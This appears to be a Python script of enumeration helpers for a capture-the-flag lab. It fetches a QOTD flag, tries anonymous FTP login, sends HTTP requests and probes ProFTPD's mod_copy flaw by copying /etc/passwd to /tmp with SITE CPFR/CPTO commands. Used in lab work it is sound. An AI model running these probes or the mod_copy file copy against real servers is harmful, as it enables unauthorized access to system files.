#!/usr/bin/env python3
"""
Enumeration scripts for the CTF targets
"""

import socket
import sys
import time

def connect_to_service(host, port, timeout=5):
    """Connect to a service and return the socket"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        return s
    except Exception as e:
        print(f"Error connecting to {host}:{port}: {e}")
        return None

def qotd_flag(host='10.12.0.136', port=17):
    """Get flag from QOTD service"""
    print(f"[*] Connecting to QOTD service on {host}:{port}")
    s = connect_to_service(host, port)
    if s:
        try:
            data = s.recv(1024).decode('utf-8', errors='ignore')
            print(f"[+] Received: {data}")
            return data
        except Exception as e:
            print(f"[-] Error receiving data: {e}")
        finally:
            s.close()
    return None

def ftp_enum(host='10.12.0.42', port=21):
    """Enumerate FTP service"""
    print(f"[*] Enumerating FTP on {host}:{port}")
    s = connect_to_service(host, port)
    if s:
        try:
            banner = s.recv(1024).decode('utf-8', errors='ignore')
            print(f"[+] Banner: {banner}")
            
            # Try anonymous login
            s.send(b'USER anonymous\r\n')
            response = s.recv(1024).decode('utf-8', errors='ignore')
            print(f"[+] USER response: {response}")
            
            s.send(b'PASS anonymous\r\n')
            response = s.recv(1024).decode('utf-8', errors='ignore')
            print(f"[+] PASS response: {response}")
            
            if '230' in response:
                print("[+] Anonymous login successful!")
                # List directory
                s.send(b'PWD\r\n')
                response = s.recv(1024).decode('utf-8', errors='ignore')
                print(f"[+] PWD: {response}")
                
                s.send(b'LIST\r\n')
                response = s.recv(4096).decode('utf-8', errors='ignore')
                print(f"[+] Directory listing: {response}")
                
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            s.close()

def http_get(host, port=80, path='/'):
    """Simple HTTP GET request"""
    print(f"[*] HTTP GET {host}:{port}{path}")
    s = connect_to_service(host, port, timeout=10)
    if s:
        try:
            request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
            s.send(request.encode())
            response = s.recv(4096).decode('utf-8', errors='ignore')
            print(f"[+] Response:\n{response[:500]}")
            return response
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            s.close()
    return None

def check_proftpd_modcopy(host='10.12.0.42', port=21):
    """Check for ProFTPD mod_copy vulnerability"""
    print(f"[*] Checking ProFTPD mod_copy on {host}:{port}")
    s = connect_to_service(host, port)
    if s:
        try:
            banner = s.recv(1024).decode('utf-8', errors='ignore')
            print(f"[+] Banner: {banner}")
            
            # Check if mod_copy is available
            s.send(b'SITE CPFR /etc/passwd\r\n')
            response = s.recv(1024).decode('utf-8', errors='ignore')
            print(f"[+] CPFR response: {response}")
            
            if '350' in response:
                print("[!] mod_copy appears to be available!")
                s.send(b'SITE CPTO /tmp/passwd\r\n')
                response = s.recv(1024).decode('utf-8', errors='ignore')
                print(f"[+] CPTO response: {response}")
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            s.close()

if __name__ == "__main__":
    print("=" * 60)
    print("CTF Enumeration Scripts")
    print("=" * 60)
    
    # Get QOTD flag
    print("\n[1] Getting QOTD flag from 10.12.0.136:17")
    qotd_flag()
    
    # FTP enumeration
    print("\n[2] Enumerating FTP on 10.12.0.42:21")
    ftp_enum()
    
    # Check ProFTPD mod_copy
    print("\n[3] Checking ProFTPD mod_copy vulnerability")
    check_proftpd_modcopy()
    
    # HTTP enumeration
    print("\n[4] Checking HTTP services")
    http_get('10.12.0.42', 80)
    http_get('10.12.0.111', 80)
    http_get('10.12.0.111', 8080)
    http_get('10.12.0.194', 80)
